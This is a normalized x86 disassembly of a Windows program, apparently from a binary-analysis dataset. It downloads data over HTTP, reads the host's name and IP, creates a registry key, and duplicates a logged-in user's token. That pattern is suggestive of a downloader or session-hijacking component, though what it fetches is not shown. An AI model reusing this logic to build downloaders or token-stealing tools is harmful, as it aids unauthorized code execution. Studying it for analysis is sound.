call sub_401630
cmp [ ebp - 0x7d474 ] 0x8
jb r-xdata
push 0x0
push 0x0
push 0x3
push r--data
push r--data
push 0x0
lea ecx [ ebp - 0x468 ]
push ecx
push eax
call [ InternetConnectW@IAT ]
mov [ ebp - 0x7d4f4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x7d4f0 ]
push eax
lea ecx [ ebp - 0x7d51c ]
mov [ ebp - 0x7d4f0 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0x7d51c ]
push eax
call sub_41a87b
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
push [ ebp - 0x7d488 ]
call j_sub_417912#2
add esp 0x4
jmp r-xdata
push 0x0
push 0x80000100
push 0x0
push 0x0
push r--data
lea ecx [ ebp - 0x260 ]
push ecx
push r--data
push eax
call [ HttpOpenRequestW@IAT ]
mov ebx eax
mov [ ebp - 0x7d4f8 ] ebx
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x7d4f0 ]
push eax
lea ecx [ ebp - 0x7d510 ]
mov [ ebp - 0x7d4f0 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0x7d510 ]
push eax
call sub_41a87b
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
call [ HttpSendRequestW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7d4f0 ]
push eax
lea ecx [ ebp - 0x7d534 ]
mov [ ebp - 0x7d4f0 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0x7d534 ]
push eax
call sub_41a87b
push 0x0
lea eax [ ebp - 0x7d46c ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push 0x5
push ebx
mov [ ebp - 0x7d46c ] 0x40
call [ HttpQueryInfoW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x7d4f0 ]
push eax
lea ecx [ ebp - 0x7d528 ]
mov [ ebp - 0x7d4f0 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0x7d528 ]
push eax
call sub_41a87b
mov esi 0x7d000
lea eax [ ebp - 0x58 ]
push eax
call sub_41832c
add esp 0x4
mov esi eax
jmp r-xdata
mov eax esi
cmp esi 0x7d000
cmovae eax ecx
lea ecx [ ebp - 0x7d470 ]
push ecx
push eax
lea eax [ ebp - 0x7d468 ]
push eax
push ebx
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x7d4f0 ] 0x0
mov ecx 0x7d000
jmp r-xdata
mov eax [ ebp - 0x7d470 ]
add [ ebp - 0x7d4f0 ] eax
sub esi eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x7d4e9 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
mov esi [ InternetCloseHandle@IAT ]
test ebx ebx
je r-xdata
push eax
lea eax [ ebp - 0x7d468 ]
push eax
lea ecx [ ebp - 0x7d4a0 ]
call sub_40d810
mov ecx 0x7d000
test esi esi
jg r-xdata
mov eax [ ebp - 0x7d4f4 ]
test eax eax
je r-xdata
push ebx
call esi
jmp r-xdata
mov eax [ ebp - 0x7d4fc ]
test eax eax
je r-xdata
push eax
call esi
mov al [ ebp - 0x7d4e9 ]
mov ecx edi
test al al
je r-xdata
push eax
call esi
push r--data
call sub_401430
lea eax [ ebp - 0x7d4a0 ]
push eax
call sub_40b140
jmp r-xdata
lea ecx [ ebp - 0x7d4a0 ]
call sub_401490
lea ecx [ ebp - 0x7d488 ]
call sub_408000
sub_413620
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push 0xffffffff
push ebx
push 0x0
push 0xfde9
call edi
mov esi eax
xor ecx ecx
lea eax [ esi + 0x1 ]
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_416889
lea ecx [ esi * 2 + 0x2 ]
push ecx
push 0x0
push eax
mov [ ebp + 0x8 ] eax
call sub_41cae0
add esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push esi
push 0xffffffff
push ebx
push 0x0
push 0xfde9
call edi
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edi eax
lea esi [ edi + 0x1 ]
push esi
call sub_416889
push esi
mov ebx eax
push 0x0
push ebx
call sub_41cae0
add esp 0x10
push 0x0
push 0x0
push edi
push ebx
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
sub_4136d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push 0xffffffff
push ebx
push 0x0
push 0x0
call edi
mov esi eax
xor ecx ecx
lea eax [ esi + 0x1 ]
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_416889
lea ecx [ esi * 2 + 0x2 ]
push ecx
push 0x0
push eax
mov [ ebp + 0x8 ] eax
call sub_41cae0
add esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push esi
push 0xffffffff
push ebx
push 0x0
push 0x0
call edi
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push esi
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edi eax
lea esi [ edi + 0x1 ]
push esi
call sub_416889
push esi
mov ebx eax
push 0x0
push ebx
call sub_41cae0
add esp 0x10
push 0x0
push 0x0
push edi
push ebx
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
sub_413780
push ebp
mov ebp esp
sub esp 0x2a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x29c ]
push eax
push 0x202
call [ Ordinal_WSOCK32_115@IAT ]
test eax eax
je r-xdata
push 0x100
lea eax [ ebp - 0x10c ]
push eax
call [ Ordinal_WSOCK32_57@IAT ]
cmp eax 0xffffffff
je r-xdata
xor al al
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x10c ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
sub esi eax
mov cl [ eax ]
mov [ esi + eax ] cl
lea eax [ eax + 0x1 ]
test cl cl
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor ecx ebp
mov al 0x1
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
sub_413820
push ebp
mov ebp esp
push 0xffffffff
push sub_430c97
mov eax [ fs : 0x0 ]
push eax
sub esp 0x100
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0xb
push r--data
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0xec ] eax
mov [ ebp - 0x10c ] 0x0
mov [ ebp - 0x88 ] 0xf
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0x9c ] 0x0
call sub_401630
mov [ ebp - 0x4 ] 0x0
push 0x2
push r--data
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x58 ] 0xf
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x6c ] 0x0
call sub_401630
push 0x3f
lea eax [ ebp - 0x53 ]
push 0x0
mov [ ebp - 0x4 ] 0x1
push eax
mov [ ebp - 0x54 ] 0x0
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0x54 ]
push eax
call sub_413780
cmp [ ebp - 0x54 ] 0x0
mov [ ebp - 0xd4 ] 0xf
mov [ ebp - 0xd8 ] 0x0
mov [ ebp - 0xe8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x54 ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0xe8 ]
call sub_401630
mov edi [ ebp - 0xd4 ]
mov esi [ ebp - 0xe8 ]
lea ecx [ ebp - 0xe8 ]
cmp edi 0x10
cmovae ecx esi
push 0x0
mov edx r--data
call sub_408880
add esp 0x4
test eax eax
jne r-xdata
sete al
test al al
sete bl
mov [ ebp - 0x4 ] 0x1
cmp edi 0x10
jb r-xdata
cmp [ ebp - 0xd8 ] eax
setne al
test eax eax
test bl bl
je r-xdata
push esi
call j_sub_417912#2
add esp 0x4
push 0x49
xor eax eax
push r--data
lea ecx [ ebp - 0xcc ]
mov [ ebp - 0xb8 ] 0x7
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] ax
call sub_408240
lea eax [ ebp - 0xcc ]
push eax
lea eax [ ebp - 0x84 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_413190
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x70 ] 0x10
lea eax [ ebp - 0x84 ]
cmovae eax [ ebp - 0x84 ]
push eax
call sub_413620
mov esi eax
mov [ ebp - 0xd4 ] 0xf
cmp [ esi ] 0x0
mov [ ebp - 0xd8 ] 0x0
mov [ ebp - 0xe8 ] 0x0
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
lea ecx [ ebp - 0x54 ]
lea edx [ ecx + 0x1 ]
nop
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ ebp - 0xe8 ]
call sub_401630
cmp [ ebp - 0x70 ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x9c ]
call sub_401630
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] 0x0
mov [ ebp - 0x84 ] 0x0
call sub_40c7e0
cmp [ ebp - 0xd4 ] 0x10
jb r-xdata
push [ ebp - 0x84 ]
call j_sub_417912#2
add esp 0x4
push esi
call sub_417912
add esp 0x4
lea ecx [ ebp - 0x84 ]
push 0xd
push 0x0
push r--data
call sub_40c8f0
mov edi [ ebp - 0x74 ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0xe8 ]
call j_sub_417912#2
add esp 0x4
push 0x0
push r--data
lea ecx [ ebp - 0xb4 ]
mov [ ebp - 0xa0 ] 0xf
mov [ ebp - 0xa4 ] 0x0
mov [ ebp - 0xb4 ] 0x0
call sub_401630
xor bl bl
mov [ ebp - 0x4 ] 0x7
cmp esi edi
jge r-xdata
push r--data
lea edx [ ebp - 0x9c ]
lea ecx [ ebp - 0x104 ]
call sub_40e4f0
add esp 0x4
lea ecx [ ebp - 0x6c ]
push ecx
mov edx eax
lea ecx [ ebp - 0xe8 ]
mov [ ebp - 0x4 ] 0x5
call sub_40e690
mov esi [ ebp - 0xec ]
push eax
push esi
mov [ ebp - 0x4 ] 0x6
call sub_411040
cmp [ ebp - 0xd4 ] 0x10
jb r-xdata
mov ebx [ ebp - 0xa4 ]
push 0xa
push 0x0
push r--data
lea ecx [ ebp - 0xb4 ]
call sub_40c8f0
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov edx [ ebp - 0x84 ]
cmp [ ebp - 0xf0 ] 0x10
mov [ ebp - 0xd4 ] 0xf
mov [ ebp - 0xd8 ] 0x0
mov [ ebp - 0xe8 ] 0x0
jb r-xdata
push [ ebp - 0xe8 ]
call j_sub_417912#2
add esp 0x4
push 0x0
push r--data
lea ecx [ ebp - 0x9c ]
add edi 0xa
call sub_401630
cmp edi ebx
jge r-xdata
push r--data
lea edx [ ebp - 0x9c ]
lea ecx [ ebp - 0xe8 ]
call sub_40e4f0
add esp 0x4
lea ecx [ ebp - 0x6c ]
push ecx
mov edx eax
lea ecx [ ebp - 0x104 ]
mov [ ebp - 0x4 ] 0x8
call sub_40e690
mov [ ebp - 0x4 ] 0x9
jmp r-xdata
test bl bl
je r-xdata
test bl bl
jne r-xdata
mov [ ebp - 0xf0 ] 0xf
mov [ ebp - 0xf4 ] 0x0
mov [ ebp - 0x104 ] 0x0
jmp r-xdata
push [ ebp - 0x104 ]
call j_sub_417912#2
add esp 0x4
push 0x4
push 0x0
push r--data
lea ecx [ ebp - 0xb4 ]
call sub_40c8f0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x8c ]
nop
mov esi [ ebp - 0xec ]
push eax
push esi
call sub_411040
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
inc esi
cmp esi edi
jl r-xdata
cmp ecx 0x10
lea eax [ ebp - 0x84 ]
cmovae eax edx
lea ecx [ ebp - 0xb4 ]
mov al [ eax + esi ]
mov [ ebp - 0x108 ] al
push [ ebp - 0x108 ]
push 0x1
call sub_40c840
mov ecx [ ebp - 0x70 ]
mov edx [ ebp - 0x84 ]
mov bl 0x1
jmp r-xdata
cmp [ ebp - 0x70 ] 0x10
jb r-xdata
push 0x0
push r--data
lea ecx [ ebp - 0x6c ]
add esi 0x4
call sub_401630
dec ebx
cmp esi ebx
jge r-xdata
push r--data
lea edx [ ebp - 0x9c ]
lea ecx [ ebp - 0xe8 ]
call sub_40e4f0
add esp 0x4
lea ecx [ ebp - 0x6c ]
push ecx
mov edx eax
lea ecx [ ebp - 0x104 ]
mov [ ebp - 0x4 ] 0xa
call sub_40e690
mov [ ebp - 0x4 ] 0xb
jmp r-xdata
cmp edx 0x10
lea eax [ ebp - 0xb4 ]
cmovae eax esi
mov dl [ eax + edi ]
or eax 0xffffffff
sub eax ecx
mov [ ebp - 0xcd ] dl
cmp eax 0x1
jbe r-xdata
cmp [ ebp - 0xd4 ] 0x10
mov [ ebp - 0xf0 ] 0xf
mov [ ebp - 0xf4 ] 0x0
mov [ ebp - 0x104 ] 0x0
jb r-xdata
push [ ebp - 0x104 ]
call j_sub_417912#2
add esp 0x4
cmp ecx 0x10
lea eax [ ebp - 0x84 ]
cmovae eax edx
cmp [ eax + esi ] 0xa
jne r-xdata
cmp [ ebp - 0xb8 ] 0x8
mov [ ebp - 0x84 ] 0x0
mov [ ebp - 0x74 ] 0x0
mov [ ebp - 0x70 ] 0xf
jb r-xdata
push [ ebp - 0x84 ]
call j_sub_417912#2
add esp 0x4
push r--data
lea edx [ ebp - 0x9c ]
lea ecx [ ebp - 0xe8 ]
call sub_40e4f0
add esp 0x4
lea ecx [ ebp - 0x6c ]
push ecx
mov edx eax
lea ecx [ ebp - 0x104 ]
mov [ ebp - 0x4 ] 0xc
call sub_40e690
mov [ ebp - 0x4 ] 0xd
mov ecx [ ebp - 0x5c ]
lea esp [ esp ]
push r--data
call sub_41682d
lea esi [ ecx + 0x1 ]
cmp esi 0xfffffffe
ja r-xdata
cmp [ ebp - 0xa0 ] 0x10
mov [ ebp - 0xd4 ] 0xf
mov [ ebp - 0xd8 ] 0x0
mov [ ebp - 0xe8 ] 0x0
jb r-xdata
push [ ebp - 0xe8 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0x58 ] 0x10
mov [ ebp - 0xcc ] ax
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0x7
jb r-xdata
push [ ebp - 0xcc ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0xa0 ] 0x10
lea eax [ ebp - 0xb4 ]
cmovae eax [ ebp - 0xb4 ]
mov dl [ eax + esi ]
or eax 0xffffffff
sub eax ecx
mov [ ebp - 0xcd ] dl
cmp eax 0x1
jbe r-xdata
cmp edx 0x10
lea eax [ ebp - 0xb4 ]
cmovae eax edi
cmp [ eax + esi + 0x1 ] 0xa3
je r-xdata
cmp [ ebp - 0x88 ] esi
jae r-xdata
mov [ ebp - 0xa0 ] 0xf
mov [ ebp - 0xa4 ] 0x0
mov [ ebp - 0xb4 ] 0x0
push [ ebp - 0xb4 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x88 ] 0x10
mov [ ebp - 0x6c ] 0x0
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x58 ] 0xf
jb r-xdata
push [ ebp - 0x6c ]
call j_sub_417912#2
add esp 0x4
lea edi [ ecx + 0x1 ]
cmp edi 0xfffffffe
ja r-xdata
test esi esi
jne r-xdata
push ecx
push esi
lea ecx [ ebp - 0x9c ]
call sub_4018d0
mov dl [ ebp - 0xcd ]
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x9c ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x58 ] edi
jae r-xdata
setne al
test al al
je r-xdata
cmp [ ebp - 0x88 ] 0x10
lea eax [ ebp - 0x9c ]
cmovae eax [ ebp - 0x9c ]
mov [ ebp - 0x8c ] esi
mov [ eax ] 0x0
mov ecx [ ebp - 0x8c ]
test esi esi
test edi edi
jne r-xdata
push ecx
push edi
lea ecx [ ebp - 0x6c ]
call sub_4018d0
mov dl [ ebp - 0xcd ]
jmp r-xdata
inc edi
cmp edi ebx
jl r-xdata
cmp [ ebp - 0x88 ] 0x10
lea eax [ ebp - 0x9c ]
cmovae eax [ ebp - 0x9c ]
mov [ ecx + eax ] dl
cmp [ ebp - 0x88 ] 0x10
lea eax [ ebp - 0x9c ]
cmovae eax [ ebp - 0x9c ]
mov [ ebp - 0x8c ] esi
mov [ esi + eax ] 0x0
mov ecx [ ebp - 0x8c ]
setne al
test al al
je r-xdata
cmp [ ebp - 0x58 ] 0x10
lea eax [ ebp - 0x6c ]
cmovae eax [ ebp - 0x6c ]
mov [ ebp - 0x5c ] edi
mov [ eax ] 0x0
mov ecx [ ebp - 0x5c ]
test edi edi
mov edx [ ebp - 0xa0 ]
mov esi [ ebp - 0xb4 ]
cmp edx 0x10
lea eax [ ebp - 0xb4 ]
cmovae eax esi
cmp [ eax + edi ] 0x20
je r-xdata
inc esi
cmp esi ebx
jl r-xdata
cmp [ ebp - 0x58 ] 0x10
lea eax [ ebp - 0x6c ]
cmovae eax [ ebp - 0x6c ]
mov [ eax + ecx ] dl
cmp [ ebp - 0x58 ] 0x10
lea eax [ ebp - 0x6c ]
cmovae eax [ ebp - 0x6c ]
mov [ ebp - 0x5c ] edi
mov [ eax + edi ] 0x0
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xa0 ]
mov edi [ ebp - 0xb4 ]
cmp edx 0x10
lea eax [ ebp - 0xb4 ]
cmovae eax edi
cmp [ eax + esi ] 0xa1
jne r-xdata
sub_414030
cmp [ edx ] 0x0
push esi
mov esi ecx
jne r-xdata
mov eax edx
push edi
lea edi [ eax + 0x2 ]
xor eax eax
push eax
push edx
push [ esi + 0x10 ]
push ecx
call sub_414350
neg eax
sbb eax eax
inc eax
pop esi
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
pop edi
sar eax 0x1
push eax
push edx
push [ esi + 0x10 ]
push ecx
mov ecx esi
call sub_414350
neg eax
sbb eax eax
inc eax
pop esi
retn
sub_414080
push ebp
mov ebp esp
push 0xffffffff
push sub_430ff9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
mov edi [ esi + 0x10 ]
inc eax
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
push 0x1
push r--data
mov ecx esi
call sub_410e00
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_410f30
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_408460
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_414140
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov edi ecx
mov ecx edx
mov [ ebp - 0x4 ] 0x0
call sub_410f30
mov esi eax
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
add eax eax
push eax
push esi
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_4141c0
push ebp
mov ebp esp
push ecx
mov eax [ edx + 0x14 ]
sub eax [ edx + 0x10 ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
cmp [ ecx + 0x10 ] eax
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx edx
call sub_410f30
push eax
mov ecx esi
call sub_410010
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0x14 ]
sub eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
jb r-xdata
sub esp 0x8
push edx
push ecx
call sub_414220
push eax
mov ecx esi
call sub_410010
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_414220
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
or edi 0xffffffff
cmp [ ebx + 0x10 ] 0xffffffff
mov esi ecx
cmovb edi [ ebx + 0x10 ]
mov edx [ esi + 0x10 ]
or eax 0xffffffff
sub eax edx
cmp eax edi
jbe r-xdata
push r--data
call sub_41682d
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
lea eax [ edx + edi ]
mov [ ebp + 0xc ] eax
cmp eax 0x7ffffffe
ja r-xdata
push r--data
call sub_41682d
mov ecx [ esi + 0x14 ]
cmp ecx eax
jae r-xdata
test eax eax
jne r-xdata
push edx
push eax
mov ecx esi
call sub_408520
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] eax
cmp ecx 0x8
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0x10
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
cmp esi ebx
jne r-xdata
add eax eax
push eax
push edx
lea eax [ ecx + edi * 2 ]
push eax
call sub_4170d0
add esp 0xc
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebx ]
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
push [ ebp + 0xc ]
mov ecx esi
call sub_408210
lea eax [ edi + edi ]
push eax
push ebx
push ecx
call sub_41a1a0
test edi edi
je r-xdata
lea eax [ edi + edi ]
push eax
push edx
push ecx
call sub_4170d0
jmp r-xdata
test edi edi
je r-xdata
add esp 0xc
sub_414350
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
cmp [ ecx + 0x10 ] edi
cmovb edi [ ecx + 0x10 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebp + 0x14 ]
cmp edi ebx
mov esi ebx
cmovb esi edi
test esi esi
je r-xdata
mov ecx [ ecx ]
xor eax eax
mov edx [ ebp + 0x10 ]
lea esp [ esp ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp edi ebx
jae r-xdata
movzx eax [ ecx ]
cmp ax [ edx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
xor eax eax
cmp edi ebx
setne al
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x10
test eax eax
jne r-xdata
mov ax [ ecx ]
cmp ax [ edx ]
jne r-xdata
sub_4143d0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x4 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push esi
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push r--data
push 0x80000002
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
push eax
call [ RegCloseKey@IAT ]
mov [ esi ] 0x0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov al 0x1
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
mov [ esi ] 0x0
xor al al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
sub_414460
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
xor esi esi
push 0x1
push esi
push esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
call [ WTSEnumerateSessionsW@IAT ]
mov edx [ ebp - 0x8 ]
xor ecx ecx
test edx edx
je r-xdata
push [ ebp - 0xc ]
call [ WTSFreeMemory@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
jmp r-xdata
movq xmm0 [ eax ]
movq [ ebp - 0x18 ] xmm0
cmp [ eax + 0x8 ] esi
je r-xdata
mov esi [ ebp - 0x18 ]
inc ecx
add eax 0xc
cmp ecx edx
jb r-xdata
jmp r-xdata
sub_4144e0
push ebp
mov ebp esp
sub esp 0x2b4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x2b4 ] eax
call sub_414460
mov ebx eax
lea eax [ ebp - 0x298 ]
push eax
xor esi esi
push ebx
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x298 ] esi
mov [ ebp - 0x294 ] esi
call [ WTSQueryUserToken@IAT ]
mov edi [ CloseHandle@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x298 ]
test eax eax
je r-xdata
xor eax eax
push eax
push 0x2
mov [ ebp - 0x8 ] eax
call [ CreateToolhelp32Snapshot@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor al al
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp - 0x14 ]
push ecx
push 0x4
lea ecx [ ebp - 0x2a0 ]
push ecx
push 0x13
push eax
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x290 ]
push eax
push esi
mov [ ebp - 0x290 ] 0x22c
call [ Process32FirstW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2a0 ]
mov [ ebp - 0x294 ] eax
lea eax [ ebp - 0xc ]
push eax
push r--data
push 0x0
call [ LookupPrivilegeValueW@IAT ]
lea eax [ ebp - 0x294 ]
push eax
push 0x1
push 0x1
push 0x0
push 0x2000000
push [ ebp - 0x298 ]
call [ DuplicateTokenEx@IAT ]
mov eax [ ebp - 0x294 ]
jmp r-xdata
push esi
call edi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea esp [ esp ]
xor ebx ebx
mov [ ebp - 0x29c ] ebx
